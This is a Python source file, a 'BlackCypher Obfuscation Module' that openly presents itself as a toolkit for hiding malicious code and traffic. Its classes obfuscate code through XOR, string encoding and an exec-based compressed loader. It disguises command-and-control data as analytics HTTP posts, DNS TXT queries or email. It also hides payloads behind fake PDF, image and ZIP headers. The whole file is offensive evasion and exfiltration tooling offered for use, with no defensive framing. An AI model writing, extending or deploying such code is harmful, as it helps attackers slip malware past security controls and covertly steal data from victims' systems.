"""
BlackCypher Obfuscation Module
Provides techniques to hide malicious code and traffic
"""
import random
import string
import base64
import zlib
import re
from typing import Union, Dict, List, Any, Callable


class StringObfuscator:
    """Obfuscates strings to avoid detection"""
    
    @staticmethod
    def xor_encode(data: Union[str, bytes], key: Union[str, bytes]) -> bytes:
        """Encode data using XOR
        
        Args:
            data: Data to encode
            key: XOR key
            
        Returns:
            XOR-encoded data as bytes
        """
        if isinstance(data, str):
            data = data.encode('utf-8')
            
        if isinstance(key, str):
            key = key.encode('utf-8')
            
        key_len = len(key)
        encoded = bytearray(len(data))
        
        for i in range(len(data)):
            encoded[i] = data[i] ^ key[i % key_len]
            
        return bytes(encoded)
    
    @staticmethod
    def caesar_cipher(text: str, shift: int) -> str:
        """Simple Caesar cipher for basic obfuscation
        
        Args:
            text: Text to encode
            shift: Number of positions to shift each character
            
        Returns:
            Encoded string
        """
        result = ""
        
        for char in text:
            if char.isalpha():
                ascii_offset = ord('a') if char.islower() else ord('A')
                shifted = (ord(char) - ascii_offset + shift) % 26 + ascii_offset
                result += chr(shifted)
            else:
                result += char
                
        return result
    
    @staticmethod
    def split_and_reassemble(code: str) -> Dict[str, Union[str, List[int]]]:
        """Split code into fragments for later reassembly
        
        Args:
            code: Code to split
            
        Returns:
            Dictionary with code fragments and assembly instructions
        """
        fragments = []
        chunk_size = random.randint(10, 30)
        
        for i in range(0, len(code), chunk_size):
            fragments.append(code[i:i+chunk_size])
            
        # Create random order
        assembly_order = list(range(len(fragments)))
        random.shuffle(assembly_order)
        
        # Reorder fragments
        shuffled_fragments = [fragments[i] for i in assembly_order]
        
        # Create reverse mapping for reassembly
        reassembly_map = [assembly_order.index(i) for i in range(len(fragments))]
        
        return {
            'fragments': shuffled_fragments,
            'reassembly_map': reassembly_map
        }
    
    @staticmethod
    def reassemble_code(obfuscated_package: Dict[str, Union[str, List[int]]]) -> str:
        """Reassemble code from fragments
        
        Args:
            obfuscated_package: Dictionary with fragments and assembly instructions
            
        Returns:
            Reassembled code
        """
        fragments = obfuscated_package['fragments']
        reassembly_map = obfuscated_package['reassembly_map']
        
        # Reorder fragments based on reassembly map
        ordered_fragments = [fragments[reassembly_map[i]] for i in range(len(fragments))]
        
        # Join fragments
        return ''.join(ordered_fragments)


class CodeObfuscator:
    """Obfuscates code to bypass signature detection"""
    
    @staticmethod
    def generate_junk_instructions() -> str:
        """Generate benign code to dilute malicious patterns
        
        Returns:
            Junk code as string
        """
        junk_patterns = [
            "temp = 0\nfor _ in range(random.randint(1, 10)):\n    temp += 1",
            "try:\n    pass\nexcept Exception:\n    pass",
            "# This is an important calculation\nx = 42 * 73\ny = x / 2",
            "def unused_function():\n    return 'unused'"
        ]
        
        return random.choice(junk_patterns)
    
    @staticmethod
    def variable_name_randomization(code: str) -> str:
        """Replace variable names with random strings
        
        Args:
            code: Python code to obfuscate
            
        Returns:
            Obfuscated code
        """
        # This is a simplified version - a real implementation would use AST parsing
        variable_pattern = r'\b([a-zA-Z_][a-zA-Z0-9_]*)\b'
        variables = set(re.findall(variable_pattern, code))
        
        # Exclude Python keywords
        python_keywords = {'False', 'None', 'True', 'and', 'as', 'assert', 'break', 
                          'class', 'continue', 'def', 'del', 'elif', 'else', 'except',
                          'finally', 'for', 'from', 'global', 'if', 'import', 'in', 
                          'is', 'lambda', 'nonlocal', 'not', 'or', 'pass', 'raise', 
                          'return', 'try', 'while', 'with', 'yield'}
        
        variables = variables - python_keywords
        
        # Create mapping of original to random variable names
        var_mapping = {}
        for var in variables:
            random_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
            var_mapping[var] = random_name
            
        # Replace variables
        obfuscated_code = code
        for original, randomized in var_mapping.items():
            # Use word boundaries to avoid partial replacements
            pattern = r'\b' + re.escape(original) + r'\b'
            obfuscated_code = re.sub(pattern, randomized, obfuscated_code)
            
        return obfuscated_code
    
    @staticmethod
    def string_encryption(code: str) -> str:
        """Replace string literals with decoding functions
        
        Args:
            code: Python code to obfuscate
            
        Returns:
            Obfuscated code with encrypted strings
        """
        # Find all string literals - this is a simplified approach
        string_pattern = r'([\'"])(.*?)\1'
        strings = re.findall(string_pattern, code)
        
        obfuscated_code = code
        
        for quote, string_content in strings:
            if len(string_content) > 0:
                # Encode the string
                encoded = base64.b64encode(string_content.encode()).decode()
                
                # Replace with decoding function call
                replacement = f"__decode('{encoded}')"
                original = quote + string_content + quote
                obfuscated_code = obfuscated_code.replace(original, replacement, 1)
        
        # Add decoding function at the beginning
        decoder_function = (
            "import base64\n"
            "def __decode(s):\n"
            "    return base64.b64decode(s).decode()\n\n"
        )
        
        return decoder_function + obfuscated_code
    
    @staticmethod
    def compress_and_encode(code: str) -> str:
        """Compress and encode code for obfuscation
        
        Args:
            code: Python code to obfuscate
            
        Returns:
            Wrapper code that decompresses and executes the original
        """
        # Compress the code
        compressed = zlib.compress(code.encode('utf-8'))
        
        # Encode as base64
        encoded = base64.b64encode(compressed).decode('utf-8')
        
        # Create wrapper code
        wrapper = (
            "import base64\n"
            "import zlib\n"
            f"__encoded = '{encoded}'\n"
            "__decoded = zlib.decompress(base64.b64decode(__encoded))\n"
            "exec(__decoded.decode('utf-8'))\n"
        )
        
        return wrapper


class TrafficObfuscator:
    """Disguises malicious traffic as legitimate communications"""
    
    @staticmethod
    def generate_fake_http_header() -> Dict[str, str]:
        """Generate believable HTTP headers to disguise C2 traffic
        
        Returns:
            Dictionary of HTTP headers
        """
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
        ]
        
        referers = [
            "https://www.google.com/search?q=legitimate+search",
            "https://www.bing.com/search?q=normal+website",
            "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
            "https://www.reddit.com/r/programming"
        ]
        
        return {
            "User-Agent": random.choice(user_agents),
            "Referer": random.choice(referers),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0"
        }
    
    @staticmethod
    def mimic_legitimate_protocol(data: bytes, protocol: str = "http") -> Dict[Any, Any]:
        """Disguise C2 traffic as legitimate protocol traffic
        
        Args:
            data: Raw data to send
            protocol: Protocol to mimic ("http", "dns", "smtp")
            
        Returns:
            Dictionary with disguised data
        """
        encoded_data = base64.b64encode(data).decode('utf-8')
        
        if protocol == "http":
            return {
                "method": "POST",
                "url": "/api/analytics/collect",
                "headers": TrafficObfuscator.generate_fake_http_header(),
                "body": {
                    "events": [
                        {"type": "pageview", "data": encoded_data[:len(encoded_data)//2]},
                        {"type": "custom", "name": "user_preference", "data": encoded_data[len(encoded_data)//2:]}
                    ],
                    "timestamp": random.randint(1600000000, 1700000000)
                }
            }
        elif protocol == "dns":
            # Split data into chunks that can fit in DNS labels
            chunks = []
            for i in range(0, len(encoded_data), 63):
                chunks.append(encoded_data[i:i+63])
                
            return {
                "query_type": "TXT",
                "domain": "analytics-collector.com",
                "subdomains": chunks
            }
        elif protocol == "smtp":
            return {
                "from": "updates@notifications-service.com",
                "to": "user@example.com",
                "subject": "Your account notification",
                "body": f"Your account has been updated.\n\nDetails: {encoded_data}"
            }
        else:
            raise ValueError(f"Unsupported protocol: {protocol}")
    
    @staticmethod
    def extract_data_from_mimicked_protocol(disguised_data: Dict[Any, Any], protocol: str = "http") -> bytes:
        """Extract original data from disguised protocol traffic
        
        Args:
            disguised_data: Data disguised as legitimate protocol
            protocol: Protocol that was mimicked
            
        Returns:
            Original raw data
        """
        if protocol == "http":
            encoded_data = disguised_data["body"]["events"][0]["data"] + disguised_data["body"]["events"][1]["data"]
        elif protocol == "dns":
            encoded_data = ''.join(disguised_data["subdomains"])
        elif protocol == "smtp":
            # Extract from email body
            parts = disguised_data["body"].split("Details: ")
            if len(parts) > 1:
                encoded_data = parts[1]
            else:
                raise ValueError("Could not extract data from SMTP body")
        else:
            raise ValueError(f"Unsupported protocol: {protocol}")
            
        return base64.b64decode(encoded_data)


class PayloadWrapper:
    """Wraps payloads to bypass security controls"""
    
    @staticmethod
    def split_payload(payload: bytes, num_chunks: int = 3) -> Dict[str, Any]:
        """Split payload into multiple chunks for covert delivery
        
        Args:
            payload: Payload to split
            num_chunks: Number of chunks to create
            
        Returns:
            Dictionary with chunks and reassembly instructions
        """
        chunk_size = len(payload) // num_chunks
        chunks = []
        
        for i in range(0, len(payload), chunk_size):
            if i + chunk_size > len(payload) or i // chunk_size == num_chunks - 1:
                chunks.append(payload[i:])
                break
            else:
                chunks.append(payload[i:i+chunk_size])
                
        # Create unique identifiers for each chunk
        chunk_ids = [f"chunk_{i}_{random.randint(1000, 9999)}" for i in range(len(chunks))]
        
        return {
            "chunks": list(zip(chunk_ids, chunks)),
            "assembly_order": chunk_ids
        }
    
    @staticmethod
    def reassemble_payload(split_data: Dict[str, Any]) -> bytes:
        """Reassemble payload from chunks
        
        Args:
            split_data: Dictionary with chunks and assembly instructions
            
        Returns:
            Reassembled payload
        """
        # Create mapping of chunk_id to chunk data
        chunk_map = {chunk_id: chunk_data for chunk_id, chunk_data in split_data["chunks"]}
        
        # Reassemble according to assembly order
        payload = b''
        for chunk_id in split_data["assembly_order"]:
            payload += chunk_map[chunk_id]
            
        return payload
    
    @staticmethod
    def wrap_in_legitimate_file(payload: bytes, file_type: str = "pdf") -> bytes:
        """Hide payload inside a legitimate-looking file
        
        Args:
            payload: Payload to hide
            file_type: Type of legitimate file to use as wrapper
            
        Returns:
            Payload hidden in a legitimate-looking file
        """
        # Headers for different file types
        file_headers = {
            "pdf": b"%PDF-1.5\n%âãÏÓ\n",
            "jpg": b"\xFF\xD8\xFF\xE0\x00\x10JFIF",
            "png": b"\x89PNG\r\n\x1A\n",
            "zip": b"PK\x03\x04",
            "docx": b"PK\x03\x04"
        }
        
        if file_type not in file_headers:
            raise ValueError(f"Unsupported file type: {file_type}")
            
        # Add header
        header = file_headers[file_type]
        
        # Add a marker that we can use to extract the payload later
        marker = b"PAYLOAD_START"
        
        # Combine header, marker, and payload
        wrapped = header + b"\n" * 10 + marker + payload
        
        return wrapped
    
    @staticmethod
    def extract_from_legitimate_file(wrapped_file: bytes) -> bytes:
        """Extract payload from a legitimate-looking file
        
        Args:
            wrapped_file: File with hidden payload
            
        Returns:
            Extracted payload
        """
        marker = b"PAYLOAD_START"
        marker_index = wrapped_file.find(marker)
        
        if marker_index == -1:
            raise ValueError("No payload found in file")
            
        # Return everything after the marker
        return wrapped_file[marker_index + len(marker):]